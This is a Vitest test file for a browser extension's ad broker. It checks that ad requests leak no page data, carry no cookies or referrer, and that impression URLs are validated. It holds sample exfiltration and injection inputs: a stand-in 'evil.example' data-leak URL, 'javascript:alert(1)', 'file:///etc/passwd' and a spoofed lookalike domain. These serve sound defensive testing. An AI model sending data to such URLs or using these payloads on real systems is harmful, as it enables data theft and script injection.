/**
 * The service worker's ad broker.
 *
 * Ads are fetched here and nowhere else, for the same reason deep analysis is:
 * the worker is the extension's single network boundary, so keeping ad traffic
 * inside it means the audit surface does not grow. A fetch added to the popup
 * would be a second boundary, and the popup is a page that renders a grade.
 *
 * The load-bearing cases are the two that constrain what leaves the machine:
 * the request body must be exactly the declared key set, and switching ads off
 * must prevent the request from being made at all rather than discarding the
 * response after the fact.
 */

// @vitest-environment happy-dom

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { AD_REQUEST_KEYS } from '../src/shared/ads/policy.js';
import { AD_NETWORKS, activeNetworks } from '../src/shared/ads/registry.js';
import { TEST_NETWORK, TEST_ORIGIN } from './helpers/ad-fixture.js';
import { SETTINGS_KEY } from '../src/shared/settings.js';
import type { AdNetwork } from '../src/shared/ads/types.js';

type Listener = (message: unknown, sender: unknown, sendResponse: (r: unknown) => void) => boolean;

let listeners: Listener[];
let fetchMock: ReturnType<typeof vi.fn>;

const ORIGIN = TEST_ORIGIN;

function creativePayload(): unknown {
  return {
    headline: 'Ship faster with Widgets',
    body: 'A tool for people who build things.',
    advertiser: 'Widget Co',
    clickUrl: `${ORIGIN}/click/abc`,
    imageUrl: `${ORIGIN}/img/abc.png`,
    viewUrl: `${ORIGIN}/view/abc`,
  };
}

/** Load the worker fresh with a stubbed extension environment. */
async function loadWorker(
  settings: Record<string, unknown> = {},
  fetchImpl?: () => Promise<Response>,
  networks: readonly AdNetwork[] = [TEST_NETWORK],
): Promise<void> {
  const storage: Record<string, unknown> = { [SETTINGS_KEY]: settings };
  listeners = [];

  (globalThis as unknown as { chrome: unknown }).chrome = {
    runtime: {
      onInstalled: { addListener: vi.fn() },
      onMessage: { addListener: (fn: Listener) => listeners.push(fn) },
    },
    storage: {
      local: {
        get: vi.fn(async (key: string) => ({ [key]: storage[key] })),
        set: vi.fn(async () => undefined),
      },
    },
  };

  fetchMock = vi.fn(
    fetchImpl ?? (async () => new Response(JSON.stringify(creativePayload()), { status: 200 })),
  );
  vi.stubGlobal('fetch', fetchMock);

  vi.resetModules();
  // The fixture must be installed into the module instance the worker will
  // import. vi.resetModules() throws away the registry the top-level import
  // touched, so setting it in beforeEach reaches a module nobody else uses.
  const registry = await import('../src/shared/ads/registry.js');
  registry.__setTestNetworks(networks);
  await import('../src/background/index.js');
}

/** Dispatch to every listener the way Chrome does; resolve with the first reply. */
function send(message: unknown): Promise<{ ok: boolean; creative?: unknown }> {
  return new Promise((resolve) => {
    let settled = false;
    const reply = (response: unknown) => {
      if (settled) return;
      settled = true;
      resolve(response as { ok: boolean; creative?: unknown });
    };
    let handled = false;
    for (const listener of listeners) {
      if (listener(message, {}, reply) === true) handled = true;
    }
    if (!handled) resolve({ ok: false });
  });
}

beforeEach(() => {
  vi.unstubAllGlobals();
});

describe('ad broker', () => {
  it('requests an ad from a registry host only', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(String(fetchMock.mock.calls[0]![0]).startsWith(TEST_ORIGIN)).toBe(true);
  });

  it('uses the transport the registry declares', async () => {
    // Networks differ, and guessing wrong ships a slot that silently never
    // fills — indistinguishable from "no ad was available".
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const init = fetchMock.mock.calls[0]![1] as RequestInit;
    expect(init.method).toBe(TEST_NETWORK.transport);
  });

  it('sends nothing about the page, whichever transport is used', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const url = String(fetchMock.mock.calls[0]![0]);
    const init = fetchMock.mock.calls[0]![1] as RequestInit;

    // Under GET the request *is* the URL, so the query string is where a leak
    // would appear. Asserting only on the body would have checked nothing.
    const everythingSent = `${url} ${init.body ? String(init.body) : ''}`;
    for (const forbidden of [
      'B0CXXXXXXX',
      'Acme Wireless Earbuds',
      'amazon.com/dp',
      'trustScore',
      'grade',
    ]) {
      expect(everythingSent, `leaked ${forbidden}`).not.toContain(forbidden);
    }

    // And the parameters that are sent are only the registry's own plus the
    // slot and formats — no install-specific value of any kind.
    const params = new URL(url).searchParams;
    const permitted = new Set([...Object.keys(TEST_NETWORK.params), 'slot', 'formats']);
    for (const key of params.keys()) {
      expect(permitted.has(key), `unexpected query parameter ${key}`).toBe(true);
    }
  });

  it('sends the declared key set when a network wants a POST body', async () => {
    await loadWorker({ adsEnabled: true }, undefined, [{ ...TEST_NETWORK, transport: 'POST' }]);
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const init = fetchMock.mock.calls[0]![1] as RequestInit;
    const body = JSON.parse(String(init.body)) as Record<string, unknown>;
    expect(Object.keys(body).sort()).toEqual([...AD_REQUEST_KEYS].sort());
  });

  it('produces an identical request on two separate installs', async () => {
    // A request that varied per install would be a fingerprint regardless of
    // what the fields were called.
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });
    const first = String(fetchMock.mock.calls[0]![0]);

    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });
    const second = String(fetchMock.mock.calls[0]![0]);

    expect(first).toBe(second);
  });

  it('carries no cookies, no cache and no referrer', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const init = fetchMock.mock.calls[0]![1] as RequestInit;
    // Ambient credentials would let the network correlate the request with any
    // other session it can see; a referrer would name the surface asking.
    expect(init.credentials).toBe('omit');
    expect(init.cache).toBe('no-store');
    expect(init.referrerPolicy).toBe('no-referrer');
  });

  it('makes no request at all when ads are switched off', async () => {
    // Not "discards the response" — the request must never leave. Fetching and
    // then throwing the result away still tells the network this install exists.
    await loadWorker({ adsEnabled: false });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });

    expect(fetchMock).not.toHaveBeenCalled();
    expect(response.creative).toBe(null);
  });

  it('returns a creative when the network answers well', async () => {
    await loadWorker({ adsEnabled: true });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.ok).toBe(true);
    expect((response.creative as { advertiser: string }).advertiser).toBe('Widget Co');
  });

  it('renders nothing rather than failing when the network errors', async () => {
    await loadWorker({ adsEnabled: true }, async () => new Response('', { status: 500 }));
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.ok).toBe(true);
    expect(response.creative).toBe(null);
  });

  it('renders nothing rather than failing when the fetch rejects', async () => {
    await loadWorker({ adsEnabled: true }, async () => {
      throw new Error('offline');
    });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.ok).toBe(true);
    expect(response.creative).toBe(null);
  });

  it('renders nothing when the network returns unparseable json', async () => {
    await loadWorker({ adsEnabled: true }, async () => new Response('not json', { status: 200 }));
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.creative).toBe(null);
  });

  it('renders nothing when the network returns a hostile creative', async () => {
    await loadWorker(
      { adsEnabled: true },
      async () =>
        new Response(
          JSON.stringify({ ...(creativePayload() as object), clickUrl: 'javascript:alert(1)' }),
          { status: 200 },
        ),
    );
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.creative).toBe(null);
  });

  it('accepts a sponsor file holding a list', async () => {
    // The direct rail serves a static JSON file with several sponsors in it.
    // If the broker only understood a single object, that whole rail would be
    // dead on arrival while every unit test of selectCreative stayed green.
    await loadWorker({ adsEnabled: true }, async () =>
      new Response(JSON.stringify([creativePayload()]), { status: 200 }),
    );
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect((response.creative as { advertiser: string } | null)?.advertiser).toBe('Widget Co');
  });

  it('still accepts a single creative object', async () => {
    await loadWorker({ adsEnabled: true });
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect((response.creative as { advertiser: string } | null)?.advertiser).toBe('Widget Co');
  });

  it('renders nothing when a list holds only invalid entries', async () => {
    await loadWorker({ adsEnabled: true }, async () =>
      new Response(JSON.stringify([{ headline: 'broken' }]), { status: 200 }),
    );
    const response = await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(response.creative).toBe(null);
  });

  it('never contacts an unconfigured network', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });

    const unconfigured = AD_NETWORKS.filter((n) => !n.configured);
    expect(unconfigured.length).toBeGreaterThan(0); // control
    const url = String(fetchMock.mock.calls[0]![0]);
    for (const network of unconfigured) {
      expect(url.startsWith(network.origin)).toBe(false);
    }
  });

  it('ignores messages that are not ad requests', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:something-else' });
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('control: the fetch spy does record calls', async () => {
    // Four assertions above are "fetch was not called". Prove the spy can see
    // a call at all, or those four pass whether or not the code is correct.
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-request', slot: 'popup' });
    expect(fetchMock).toHaveBeenCalled();
  });
});

/**
 * Impression counting, which is the one place a URL arrives by message.
 *
 * Everything else the worker fetches is built from the registry. A view URL
 * comes in on `winnow:ad-view`, and any code that can send a runtime message
 * can therefore propose a destination. Unvalidated, that is an exfiltration
 * primitive: `winnow:ad-view` with `viewUrl: https://evil.example/?d=<data>`
 * turns the worker into a willing courier.
 *
 * This is the same hazard `isDevEndpoint` exists to close for the developer
 * endpoint setting, and it deserves the same treatment rather than trust in
 * the fact that today's only caller happens to pass a validated value.
 */
describe('impression counting', () => {
  it('counts a view on a registry host', async () => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/abc` });
    await new Promise((r) => setTimeout(r, 0));

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(String(fetchMock.mock.calls[0]![0])).toBe(`${ORIGIN}/view/abc`);
  });

  it.each([
    'https://evil.example.com/?d=leak',
    'http://server.ethicalads.io/view/abc',
    'javascript:alert(1)',
    'file:///etc/passwd',
    'https://server.ethicalads.io.evil.com/view',
    '',
    'not a url',
  ])('refuses to fetch %s', async (viewUrl) => {
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-view', viewUrl });
    await new Promise((r) => setTimeout(r, 0));

    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('counts no view when ads are switched off', async () => {
    // Someone who turned sponsorship off has asked not to be counted, and a
    // stale message must not count them anyway.
    await loadWorker({ adsEnabled: false });
    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/abc` });
    await new Promise((r) => setTimeout(r, 0));

    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('control: the view fetch does happen for a valid url', async () => {
    // Nine assertions above are "fetch was not called". Prove the path works.
    await loadWorker({ adsEnabled: true });
    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/xyz` });
    await new Promise((r) => setTimeout(r, 0));
    expect(fetchMock).toHaveBeenCalled();
  });
});
